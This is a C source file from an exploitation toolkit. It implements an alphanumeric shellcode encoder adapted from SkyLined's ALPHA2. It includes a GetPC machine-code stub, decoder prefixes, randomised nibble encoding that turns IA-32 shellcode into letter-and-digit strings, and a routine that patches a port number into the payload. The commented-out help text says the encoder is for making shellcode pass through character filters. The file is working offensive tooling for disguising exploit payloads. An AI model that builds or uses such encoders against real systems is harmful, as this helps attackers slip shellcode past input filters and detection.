/* Copyright© 2004-2008 Nelson Brito
 * This file is part of the ENG Private Tool by Nelson Brito.

   This program is free software; you can redistribute it and/or modify it under
   the terms of the GNU General Public License  version 2, 1991  as published by
   the Free Software Foundation.

   This program is distributed  in the hope that it will be useful,  but WITHOUT
   ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
   FOR A PARTICULAR PURPOSE.  
   
   See the GNU General Public License for more details.

   A copy of the GNU General Public License can be found at:
   http://www.gnu.org/licenses/gpl.html
   or you can write to:
   Free Software Foundation, Inc.
   59 Temple Place - Suite 330
   Boston, MA  02111-1307
   USA. */
#ifndef __ALPHA2_C
#define __ALPHA2_C 1
/* Nelson Brito <nbrito@sekure.org>
   $Id: alpha2.c,v 1.16 2008-09-14 17:57:14-03 nbrito Exp $ */
#include "common.h"
/*
________________________________________________________________________________

    ,sSSs,,s,  ,sSSSs,  ALPHA 2: Zero-tolerance.
   SS"  Y$P"  SY"  ,SY
  iS'   dY       ,sS"   Unicode-proof uppercase alphanumeric shellcode encoding.
  YS,  dSb    ,sY"      Copyright (C) 2003, 2004 by Berend-Jan Wever.
  `"YSS'"S' 'SSSSSSSP   <skylined@edup.tudelft.nl>
________________________________________________________________________________

  This program is free software; you can redistribute it and/or modify it under
  the terms of the GNU General Public License version 2, 1991 as published by
  the Free Software Foundation.

  This program is distributed in the hope that it will be useful, but WITHOUT
  ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
  FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
  details.

  A copy of the GNU General Public License can be found at:
    http://www.gnu.org/licenses/gpl.html
  or you can write to:
    Free Software Foundation, Inc.
    59 Temple Place - Suite 330
    Boston, MA  02111-1307
    USA.

Acknowledgements:
  Thanks to rix for his phrack article on aphanumeric shellcode.
  Thanks to obscou for his phrack article on unicode-proof shellcode.
  Thanks to Costin Ionescu for the idea behind w32 SEH GetPC code.
*/

struct decoder decoder[] = {
	{ "ecx", "IIIIIIIIIIIIIIIII7QZ", MIXEDCASE_ASCII_DECODER },
	{ "ecx", "77777777777777777777777777777777777QZ", MIXEDCASE_ASCII_DECODER },
	{ "ecx", "7777777777777777777777QZ", UPPERCASE_ASCII_DECODER },
	{ "ecx", "IIIIIIIIIIIQZ", UPPERCASE_ASCII_DECODER },
};

/*
void version(void) {
  printf(
    "________________________________________________________________________________\n"
    "\n"
    "    ,sSSs,,s,  ,sSSSs,  " VERSION_STRING "\n"
    "   SS\"  Y$P\"  SY\"  ,SY \n"
    "  iS'   dY       ,sS\"   Unicode-proof uppercase alphanumeric shellcode encoding.\n"
    "  YS,  dSb    ,sY\"      " COPYRIGHT "\n"
    "  `\"YSS'\"S' 'SSSSSSSP   <skylined@edup.tudelft.nl>\n"
    "________________________________________________________________________________\n"
    "\n"
  );
  exit(EXIT_SUCCESS);
}
void help(char* name) {
  printf(
    "Usage: %s [OPTION] [BASEADDRESS]\n"
    "ALPHA 2 encodes your IA-32 shellcode to contain only alphanumeric characters.\n"
    "The result can optionaly be uppercase-only and/or unicode proof. It is a encoded\n"
    "version of your origional shellcode. It consists of baseaddress-code with some\n"
    "padding, a decoder routine and the encoded origional shellcode. This will work\n"
    "for any target OS. The resulting shellcode needs to have RWE-access to modify\n"
    "it's own code and decode the origional shellcode in memory.\n"
    "\n"
    "BASEADDRESS\n"
    "  The decoder routine needs have it's baseaddress in specified register(s). The\n"
    "  baseaddress-code copies the baseaddress from the given register or stack\n"
    "  location into the apropriate registers.\n"
    "eax, ecx, edx, ecx, esp, ebp, esi, edi\n"
    "  Take the baseaddress from the given register. (Unicode baseaddress code using\n"
    "  esp will overwrite the byte of memory pointed to by ebp!)\n"
    "[esp], [esp-X], [esp+X]\n"
    "  Take the baseaddress from the stack.\n"
    "seh\n"
    "  The windows \"Structured Exception Handler\" (seh) can be used to calculate\n"
    "  the baseaddress automatically on win32 systems. This option is not available\n"
    "  for unicode-proof shellcodes and the uppercase version isn't 100%% reliable.\n"
    "nops\n"
    "  No baseaddress-code, just padding.  If you need to get the baseaddress from a\n"
    "  source not on the list use this option (combined with --nocompress) and\n"
    "  replace the nops with your own code. The ascii decoder needs the baseaddress\n"
    "  in registers ecx and edx, the unicode-proof decoder only in ecx.\n"
    "-n\n"
    "  Do not output a trailing newline after the shellcode.\n"
    "--nocompress\n"
    "  The baseaddress-code uses \"dec\"-instructions to lower the required padding\n"
    "  length. The unicode-proof code will overwrite some bytes in front of the\n"
    "  shellcode as a result. Use this option if you do not want the \"dec\"-s.\n"
    "--unicode\n"
    "  Make shellcode unicode-proof. This means it will only work when it gets\n"
    "  converted to unicode (inserting a '0' after each byte) before it gets\n"
    "  executed.\n"
    "--uppercase\n"
    "  Make shellcode 100%% uppercase characters, uses a few more bytes then\n"
    "  mixedcase shellcodes.\n"
    "--sources\n"
    "  Output a list of BASEADDRESS options for the given combination of --uppercase\n"
    "  and --unicode.\n"
    "--help\n"
    "  Display this help and exit\n"
    "--version\n"
    "  Output version information and exit\n"
    "\n"
    "See the source-files for further details and copying conditions. There is NO\n"
    "warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.\n"
    "\n"
    "Acknowledgements:\n"
    "  Thanks to rix for his phrack article on aphanumeric shellcode.\n"
    "  Thanks to obscou for his phrack article on unicode-proof shellcode.\n"
    "  Thanks to Costin Ionescu for the idea behind w32 SEH GetPC code.\n"
    "\n"
    "Report bugs to <skylined@edup.tudelft.nl>\n",
    name
  );
  exit(EXIT_SUCCESS);
}
*/

u_int8_t * alpha2(struct options options, u_int8_t * buffer, struct shellcode shellcode){
	u_int8_t  * valid_chars,
		  * getpc = "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff",
		    a, b, *c,
		    /* Yeah, a little Copyright... You will find other in common.h. */
		    d[6] = { 'N' , 'B', 'R', 'I', 'T', 'O' };
	int32_t   e = 0, f, g, h = 0, A, B, C, D, E, F, G;
	struct    timeval  seed;  /* seed for random */

	/* Using microseconds as seed. */
	gettimeofday(&seed, (struct timezone *)0);
	srand((unsigned) seed.tv_usec);

	/* Using random Decoder. */
	f = (sizeof(decoder)/sizeof(struct decoder));
	f = (u_int32_t)((float)f * rand() / (RAND_MAX + 1.0));

	c = (u_int8_t *) process_nops(decoder[f].code, strlen(decoder[f].code));

	/* Testing if uses UPPERCASE or MIXEDCASE.
	   
	   XXX Here is some gotchas XXX
	   (1) If Uppercase is the choice, valid_chars must be UPPERCASE;
	   (2) If Mixedcase is the choice, valid_chars must be MIXEDCASE;
	   (3) The getpc for Mixedcase in the last position in the struct
	       so the code will allways ignore the Mixed case when using
	       Uppercase. */
	if(f >= 2){ /* UPPERCASE? */
		valid_chars = "0123456789BCDEFGHIJKLMNOPQRSTUVWXYZ";

	} else {      /* MIXEDCASE? */
		valid_chars = "0123456789BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
	}

	/* Setting the size of buffer to store all data.

	   XXX Here is some gotchas XXX
	   (1) First data to copy into the buffer is the getpc.code, and
	       the second is the decoder.code.
	   (2) Due to the logic implemented in the Alpha2.e all one byte
	       is splited in two new bytes, and then copied to the buffer,
	       so the size of shellcode must be duplicated to have enough
	       space in memory to store.
	   (3) Finaly the last byte (A) must copied to the end of buffer. */
	buffer = (u_int8_t *) malloc(strlen(getpc) + strlen(c) + strlen(decoder[f].choice) + (shellcode.size * 2) + sizeof(u_int8_t));

	/* Copying the GetPC to Buffer. */
	memcpy(buffer, getpc, strlen(getpc));

	/* Copying the Decoder to Buffer. */
	memcpy(buffer + strlen(getpc), c, strlen(c));
	
	/* Copying the Decoder to Buffer. */
	memcpy(buffer + strlen(getpc) + strlen(c), decoder[f].choice, strlen(decoder[f].choice));
	
	/* To use a program getting the shellcode from a internal variable,
	   the program should use as following:
	   	while(byte < shellcode_bytes) { do_something(); }

	   Because ASCII Shellcode has double size of the regular.

	   XXX Here is some gotchas XXX
	   (1) When getting the byte 0xff, as example, the code does:
	       - A is going to get the first 4 bits (0x0f in this case);
	       - B is going to get the last 4 bits (0xf0 in this case);
	       - G is used only when the h (shellcode actual byte)
		 is reached, and then before split the byte it replaces
		 for the port option.
	       - G will do the same for the second byte.
	   (2) In this case the program will replace every byte with two
	       bytes required by Alpha2.e.

	   Here is the original author's comments and code:
	   "read, encode and output shellcode"
	   while((h = getchar()) != EOF){ */
	while(h < shellcode.size){
		/* Here is the original author's comments and code:
		   "encoding AB -> CD 00 EF 00" */
		if((shellcode.position) && (h == shellcode.position)){
				G = (options.port >> 8) & 0xff;
				A = (G & 0xf0) >> 4;
				B = (G & 0x0f);
		} else if ((shellcode.position) && (h == (shellcode.position + 1))){
				G = options.port & 0xff;
				A = (G & 0xf0) >> 4;
				B = (G & 0x0f);
		} else {
			A = (shellcode.shellcode[h] & 0xf0) >> 4;
			B = (shellcode.shellcode[h] & 0x0f);
		}
		
		F = B;

		/* Here is the orginal author's comments:
		   "E is arbitrary as long as EF is a valid character" */
		g = (u_int32_t)((float)strlen(valid_chars) * rand() / (RAND_MAX + 1.0));

		while((valid_chars[g] & 0x0f) != F)
			g = ++g % strlen(valid_chars);
		
		E = valid_chars[g] >> 4;
		/* Ignoring Unicode ASCII decoder and using just XOR. In fact, 
		   all the Unicode stuff was removed from this code.

		   Here is the original author's comments and code:
		   "normal code uses xor, unicode-proof uses ADD."
		   "AB ->"
		    D =  unicode ? (A-E) & 0x0f : (A^E); */
		D =  (A^E);
		// C is arbitrary as long as CD is a valid character
		g = (u_int32_t)((float)strlen(valid_chars) * rand() / (RAND_MAX + 1.0));

		while((valid_chars[g] & 0x0f) != D)
			g = ++g % strlen(valid_chars);

		C = valid_chars[g] >> 4;

		/* Copying the content to Buffer. 
		   
		   XXX Here is some gotches XXX
		   (1) strlen(buffer) cannot be used to increment - as done
		       in sendexp(), because the malloc() was used instead 
		       of memset(). 
		   (2) Variable 'a' is the first piece of the splited byte.
		   (3) Variable 'b' is the second piece of the splited byte. */

		/* Getting the first piece of splited byte. */
		a = ((C<<4)+D) & 0xff;
		memcpy(buffer + strlen(getpc) + strlen(c) + strlen(decoder[f].choice) + e++, (u_int8_t *)&a, sizeof(a));
		
		/* Getting the second piece of splited byte. */
		b = ((E<<4)+F) & 0xff;
		memcpy(buffer + strlen(getpc) + strlen(c) + strlen(decoder[f].choice) + e++, (u_int8_t *)&b, sizeof(b));

		h++;
	}

	g = (u_int32_t)((float)sizeof(d) * rand() / (RAND_MAX + 1.0));

	/* Inserting the last character to the end of encoded shellcode.
 
	   Here is the original author's comments and code:
	   printf("A\n"); // Terminating "A" */
	memcpy(buffer + strlen(getpc) + strlen(c) + strlen(decoder[f].choice) + e++, (u_int8_t *)&d[g], sizeof(u_int8_t));

	return(buffer);
}
#endif  /* __ALPHA2_C */
